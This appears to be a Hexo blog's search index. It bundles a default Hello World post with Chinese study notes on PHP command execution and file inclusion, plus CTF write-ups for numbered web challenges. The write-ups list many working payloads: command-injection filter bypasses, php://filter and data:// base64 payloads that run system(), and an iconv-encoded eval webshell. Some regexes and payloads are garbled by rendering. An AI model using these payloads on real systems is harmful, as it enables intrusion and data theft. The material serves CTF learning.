<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2022/05/30/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="hljs bash">$ hexo server</code></pre>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="hljs bash">$ hexo generate</code></pre>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="hljs bash">$ hexo deploy</code></pre>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>命令执行函数</title>
    <url>/2022/06/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<p>命令执行函数</p>
<span id="more"></span>

<h2 id="远程命令执行函数"><a href="#远程命令执行函数" class="headerlink" title="远程命令执行函数"></a>远程命令执行函数</h2><p>1.eval() 函数传入的参数必须为 PHP 代码，并以分号结尾。<br>2.assert() 函数是直接将传入的参数当成 PHP 代码执行，不需要以分号结尾。<br>3.&#x2F;e 修正符使 preg_replace() 将替换后的 repl 参数当作 PHP 代码并以 eval() 函数方式执行。<br>提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语<br>4.array_map()  将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带新值的数组。<br>动态函数执行 PHP 函数可直接由字符串拼接而成。<br>5.Python 中的执行命令函数：exec()<br>6.Java 没有类似于前面两者的函数，但是有反射机制，并且有基于反射机制的表达式引擎，如：0GNL、SpEL、MVEL<br>##系统执行命令<br>###常用系统执行命令<br>执行外部程序，并显示输出system()<br>执行一个外部程序exec()<br>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。shell_exec()<br>执行 unix 系统命令并且显示原始输出passthru()<br>在当前进程空间执行指定程序pcntl_exec()<br>打开进程文件指针popen()<br>执行一个命令，并且打开用来输入&#x2F;输出的文件指针proc_open()<br>###常用命令执行特殊字符<br>“cmd1|cmd2”：无论 cmd1 是否成功执行，都执行 cmd2 语句。<br>“cmd1||cmd2”：仅在 cmd1 语句执行 false 时执行后面的语句。<br>“cmd1&amp;cmd2”：无否成功执行，都执行 cmd2 语句。<br>“cmd1&amp;&amp;cmd2”：cmd1 成功执行时，才执行 cmd2 ，否则不执行<br>only unix   “&gt;(cmd)”：如当执行 &gt;(ls) 时，bash 将使用 &#x2F;dev&#x2F;fd&#x2F;63 替换 ls 命令，将 &#x2F;dev&#x2F;fd&#x2F;63 连接 bash 标准输入并执行 ls 命令(ls没有使用标准输入)。bash 将写入新的标准提示符，并紧跟着在此提示符后面输出 ls 命令的结果。在提示符下方的光标位置中，你可以输入任何的命令，这些命令都会生效，但是不会显示任何提示。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="通过命令执行写入恶意文件"><a href="#通过命令执行写入恶意文件" class="headerlink" title="通过命令执行写入恶意文件"></a>通过命令执行写入恶意文件</h3><h3 id="利用特殊字符执行系统命令"><a href="#利用特殊字符执行系统命令" class="headerlink" title="利用特殊字符执行系统命令"></a>利用特殊字符执行系统命令</h3>]]></content>
  </entry>
  <entry>
    <title>命令执行</title>
    <url>/2022/06/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p> 命令执行</p>
<span id="more"></span>

<h2 id="29"><a href="#29" class="headerlink" title="29"></a>29</h2><p>分析代码： if(!preg_match(“&#x2F;flag&#x2F;i”, $c))<br>preg_match 函数用于执行一个正则表达式匹配。&#x2F;i意味着不分大小写。本句含义是不能用flag值且忽略了大小写。从这句可以看出过滤了flag。<br>解答：传入 ?c&#x3D;echo ‘’?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php 在使用base64解码。<br>&#x2F;&#x2F;空格过滤:<br>%09 符号需要php环境<br>{cat,flag.txt}<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>kg&#x3D;$’\x20flag.txt’&amp;&amp;cat$kg<br>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)<br>cat过滤：<br>more:一页一页的显示档案内容<br>less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）<br>&#x2F;&#x2F;</p>
<h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><p>分析代码：if(!preg_match(“&#x2F;flag|system|php|cat|sort|shell|.| |’|<code>|echo|;|(/i”, $c)) 过滤了flag,system,php,cat,sort,shell,echo,分号，空格，单引号，括号，空格 解答：尝试include”/etc/passwd”?&gt;可以执行，且代码没有过滤$，用c=include”$_POST[x]”?&gt;或者c=include”$_GET[x]”?&gt;然后用php伪协议将include包含的文件在页面上显示出来 payload：?c=include”$_GET[url]”?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php 在使用base64解码。 ###33-36（解答一样） 分析代码： if(!preg_match(“/flag|system|php|cat|sort|shell|.| |&#39;|</code>|echo|;|(|”&#x2F;i”, $c))<br>过滤了flag,system,php,cat,sort,shell,echo,分号，单引号，双引号，空格，括号还有单双引号<br>解答：用php伪协议将include包含的文件在页面上显示出来<br>payload：?c&#x3D;include”$_GET[url]”?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php 在使用base64解码。<br>###37<br>分析代码： if(!preg_match(“&#x2F;flag&#x2F;i”, $c)){ include($c);<br>过滤了flag ，又是 include 文件包含<br>解答：1.flag使用绕过 ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain, 查看源码<br>2.利用伪协议读flag ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D; 查看源代码。<br>###38<br>分析代码: if(!preg_match(“&#x2F;flag|php|file&#x2F;i”, $c)){ include($c);<br>过滤了flag和php ，又是 include 文件包含<br>解答: 利用伪协议读flag查看源码<br>###39<br>分析代码: if(!preg_match(“&#x2F;flag&#x2F;i”, $c)){ include($c.”.php”);<br>过滤了flag,限制了.php后缀<br>解答：我们可以试试伪协议，因为不能带有flag，所以filter协议和php:&#x2F;&#x2F;input也不好用了。data:&#x2F;&#x2F;text&#x2F;plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用<br>flag使用绕过：?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain, 查看源码<br>###40<br>分析代码：过滤了引号、美元符号、冒号，这里可以构造无参数函数进行文件读取，正则中的括号不是英文的 是过滤了中文的括号<br>解答：show_source(next(array_reverse(scandir(pos(localeconv()))))); GXYCTF的禁止套娃 通过cookie获得参数进行命令执行<br>c&#x3D;session_start();system(session_id()); passid&#x3D;ls<br>###41<br>分析代码：这个题过滤了$、+、-、^使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。<br>我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。<br>解答：使用脚本<br>###42<br>分析代码： system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”); &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1主要意思是不进行回显的意思，可参考Shell脚本<br>解答：我们要让命令回显，那么进行命令分隔即可 可构造playload:cat flag.php 查看源代码<br>###43<br>分析代码：if(!preg_match(“&#x2F;;|cat&#x2F;i”, $c)){ system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”); }<br>过滤了cat和分号<br>解答：可以构造playload:?c&#x3D;nl flag.php|| 查看源代码<br>&#x2F;&#x2F;payload有很多:<br>?c&#x3D;more flag.php||<br>?c&#x3D;sort flag.php||<br>?c&#x3D;less flag.php||<br>?c&#x3D;tac flag.php||<br>?c&#x3D;tail flag.php||<br>?c&#x3D;nl flag.php||<br>?c&#x3D;strings flag.php||<br>&#x2F;&#x2F;<br>###44<br>分析代码：if(!preg_match(“&#x2F;;|cat|flag&#x2F;i”, $c)){ system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”); }<br>过滤了cat，flag和分号<br>解答：构造playload:?c&#x3D;more ????.???|| ?c&#x3D;more fla*.php|| ?c&#x3D;more fl\ag.php|| ?c&#x3D;more fl’’ag.php|| 查看源代码<br>###45<br>分析代码： if(!preg_match(“&#x2F;;|cat|flag| &#x2F;i”, $c)){ system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”); }<br>过滤了空格，cat，flag和分号<br>解答：构造playload：?c&#x3D;more%09fla*.php|| 查看源代码<br>###46<br>分析代码：if(!preg_match(“&#x2F;;|cat|flag| |[0-9]|$|<em>&#x2F;i”, $c)){ system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”); }<br>过滤了空格，cat，flag和分号增加了过滤数字￥</em><br>解答：构造playload：?c&#x3D;more%09????.???|| 查看源代码 空格可用%09 （不属于数字）<br>###47-49（基本一样）<br>分析代码： if(!preg_match(“&#x2F;;|cat|flag| |[0-9]|$|<em>|more|less|head|sort|tail&#x2F;i”, $c)){ system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”); }<br>多过滤了一些内容<br>解答：构造playload：?c&#x3D;tac%09????.???|| 查看源代码<br>###50<br>分析:%09被过滤<br>解答：使用&lt;&gt;代替空格&lt;&gt;和?同时使用不回显 所以用\代替？构造playload：<br>?c&#x3D;tac&lt;&gt;fla\g.php|| 查看源代码<br>###51<br>分析:tac被过滤了<br>解答：构造playload: ?c&#x3D;nl&lt;&gt;fla\g.php|| 查看源代码<br>###52<br>分析多过滤了一些内容<br>解答：构造playload:?c&#x3D;nl${IFS}&#x2F;????|| ?c&#x3D;nl${IFS}&#x2F;fl’’ag||<br>###53<br>分析:过滤了;|cat|flag|空格|数字|</em>|几个查看文件命令|%|&lt;&gt;<br>解答：$IFS符号如果是在当前目录读文件则中间要用’’来分隔一下如果读其他路径下的如根目录 &#x2F; 下的文件 则不用使用符分割$IFS后边可以使用符号 但是不能直接跟字符 会显示无效命令<br>构造playload：?c&#x3D;nl${IFS}????.??? 查看源代码<br>###54<br>分析:增加了很多过滤信息<br>解答：构造playload：?c&#x3D;uniq${IFS}????.???查看源代码<br>###55<br>分析代码： if(!preg_match(“&#x2F;;|[a-z]|<code>|%|\x09|\x26|&gt;|&lt;/i”, $c)) 过滤了字母 解答：构造layload：?c=/???/????64 ????.??? ?c=/???/???/????2 ????.??? 查看源代码 ###56 分析代码： if(!preg_match(“/;|[a-z]|[0-9]|\$|(|&#123;|&#39;|&quot;|</code>|%|\x09|\x26|&gt;|&lt;&#x2F;i”, $c))<br>过滤了字母和数字<br>解答：无数字字母getshell<br>###57<br>分析代码： if(!preg_match(“&#x2F;;|[a-z]|[0-9]|<code>||#|&#39;|&quot;|</code>|%|\x09|\x26|\x0a|&gt;|&lt;|.|,|?|*|-|&#x3D;|[&#x2F;i”, $c))<br>过滤了字母、数字、分号、2个通配符<br>解答：取反 构造payload：查看源代码<br>?c&#x3D;$(($(($(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))))))<br>###58-65<br>分析代码：禁用函数<br>解答：POST传参<br>构造playload：c&#x3D;show_source(‘flag.php’); 查看源代码<br>###66<br>分析代码：用show_source()，回显该函数被禁用<br>解答：post 传参 构造playload：c&#x3D;print_r(scandir(“&#x2F;“)); 查看源代码<br>###67<br>分析代码：用show_source()，回显该函数被禁用多过滤了print_r()函数，可以使用var_dump()函数代替<br>解答：POST传参 c&#x3D;var_dump(scandir(‘&#x2F;‘)); c&#x3D;highlight_file(‘&#x2F;flag.txt’); 查看源代码<br>###68<br>分析代码：这题把highlight_file()函数给ban了，看不到源码<br>解答：c&#x3D;var_dump(scandir(‘&#x2F;‘)); c&#x3D;include(‘&#x2F;flag.txt’);查看源代码<br>虽然把print_r()函数ban了，但是这题没有ban include，可以利用文件包含漏洞读取flag.txt<br>###69-70<br>分析代码：var_dump()函数被ban，那就用var_export()函数<br>解答：c&#x3D;var_export(scandir(‘&#x2F;‘)); c&#x3D;include(‘&#x2F;flag.txt’); 查看源代码<br>###71<br>分析代码：$s &#x3D; ob_get_contents();&#x2F;&#x2F;得到缓冲区的数据。 ob_end_clean();&#x2F;&#x2F;会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容<br>解答：构造playload;c&#x3D;var_export(scandir(‘&#x2F;‘));exit(); c&#x3D;include(“&#x2F;flag.txt”);die(); 查看源代码<br>###72<br>分析代码：存在open_basedir，利用glob伪协议在筛选目录时不受open_basedir制约<br>解答：知道了文件是&#x2F;flag0.txt之后，就要想办法绕过open_basedir和disable_functions来读了。<br>需要在burp中编码后发送<br>###73-74<br>分析代码：glob协议遍历出文件<br>解答：1.构造playload：c&#x3D;var_export(scandir(‘&#x2F;‘));exit(); &#x2F;&#x2F;发现根目录下有flagc.txt c&#x3D;include(‘&#x2F;flagc.txt’);exit(); 查看源代码<br>2.可以利用数组遍历的方法输出根目录下的所有文件<br>###75-76<br>分析代码：数据库的连接是读配置文件得到的SQL语句来读文件绕过open_basedir和disable_function<br>解答：<br>c&#x3D;?&gt; 查看源代码<br>###77<br>分析：这题在题干中说到php7.4，可以想到FFI<br>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。<br>解答：通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag<br>###118<br>分析：了解一下Linux 基础知识：Bash的内置变量常见 Bash 内置变量介绍：<br>root@baba:# echo ${PWD}<br>&#x2F;root<br>root@baba:# echo ${PWD:1:1} &#x2F;&#x2F;表示从第2（1+1）个字符开始的一个字符<br>r<br>root@baba:# echo ${PWD:0:1} &#x2F;&#x2F;表示从第1（0+1）个字符开始的一个字符<br>&#x2F;<br>root@baba:# echo ${PWD:0:1} &#x2F;&#x2F;表示从最后一个字符开始的一个字符<br>t<br>root@baba:# echo ${PWD:A} &#x2F;&#x2F;字母代表0<br>t<br>所以可以利用各个环境变量的最后一位来构造命令。 ${PWD}在这题肯定是&#x2F;var&#x2F;www&#x2F;html，而${PATH}通常是bin,那么${PWD:A}的结果就应该是’ l ‘，因为${PATH:A}的结果是’ n ‘，那么他们拼接在一起正好是nl，能够读取flag，因为通配符没有被过滤，所以可以用通配符代替flag.php<br>解答：code&#x3D;${PATH:A}${PWD:A} ????.??? 查看源代码<br>###119-120<br>分析：多过滤了path<br>解答：code&#x3D;${PWD::$</p>
]]></content>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2022/06/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>文件包含</p>
<span id="more"></span>

<h3 id="78"><a href="#78" class="headerlink" title="78"></a>78</h3><p>提示: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>分析：使用 include进行了文件包含<br>解答: filter伪协议 payload 在网址后输入&#x2F;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php 然后base64解码</p>
<h3 id="79"><a href="#79" class="headerlink" title="79"></a>79</h3><p>提示：?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;<br>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs &#x3D;&#x3D;&#x3D;&gt; &lt;?php system(‘cat flag.php’);<br>分析：替换了 php，data伪协议<br>解答:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;查看源码</p>
<h3 id="87"><a href="#87" class="headerlink" title="87"></a>87</h3><p>提示：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;2.php<br>%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%2<br>5%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%<br>33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36<br>%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%3<br>3%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%<br>25%37%32%25%36%33%25%36%35%25%33%64%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30<br>因为通过base64过滤之后就只有(phpdie)6个字符我们就要添加2个字符让前面的可以进行编码<br>分析：不同变量死亡绕过。<br>解答：</p>
<h3 id="88"><a href="#88" class="headerlink" title="88"></a>88</h3><p>提示：发现过滤的还是比较多，但是没有过滤 : 那我们就可以使用PHP伪协议就是 这里使用的是 data:&#x2F;&#x2F;text&#x2F;plain;base64,poc  只是注意的是编码成base64的时候要去掉 ＝<br>解答：实际上就是去掉base64后的&#x3D;，作为填充使用，不影响结果 ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4 查看源码<br>###116<br>分析：过滤了几个过滤器，常用的base64肯定不能用了<br>解答：构造playload：?file&#x3D;compress.zlib:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php或者?file&#x3D;flag.php<br>然后进行抓包</p>
<h3 id="117"><a href="#117" class="headerlink" title="117"></a>117</h3><p>提示：payload: file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?<br>分析：死亡绕过不同变量 这里过滤了 base64那就是 base64-decode了。过滤了string不能使用 字符过滤器了，但是convert还是可以使用 转换过滤器可以使用convert.iconv.*<br>解答：构造payload：file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php<br>然后POST传参： post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?</p>
]]></content>
  </entry>
  <entry>
    <title>文件包含原理</title>
    <url>/2022/06/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<p>文件包含</p>
<span id="more"></span>

<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。<br>###常见的四个函数<br>1、include() 当使用该函数包含文件时，只有代码执行到 include() 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。<br>2、include_once() 功能和 include() 相同，区别在于当重复调用同一文件时，程序只调用一次。<br>3、require() 只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行<br>4、require_once() 它的功能与 require() 相同，区别在于当重复调用同一文件时，程序只调用一次。<br>当使用这四个函数包含一个新文件时，该文件将作为 PHP 代码执行，php 内核并不在意该被包含的文件是什么类型。所以如果被包含的是 txt 文件、图片文件、远程 url、也都将作为 PHP 代码执行。这一特性，在实施攻击时非常有用。<br>###分类<br>文件包含漏洞可以分为 RFI (远程文件包含)和 LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是 php.ini 中是否开启了allow_url_include。如果开启 了我们就有可能包含远程文件。<br>1、本地文件包含 LFI(Local File Include)<br>2、远程文件包含 RFI(Remote File Include)（需要 php.ini 中 allow_url_include&#x3D;on、allow_url_fopen &#x3D; On）<br>在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。</p>
]]></content>
  </entry>
</search>
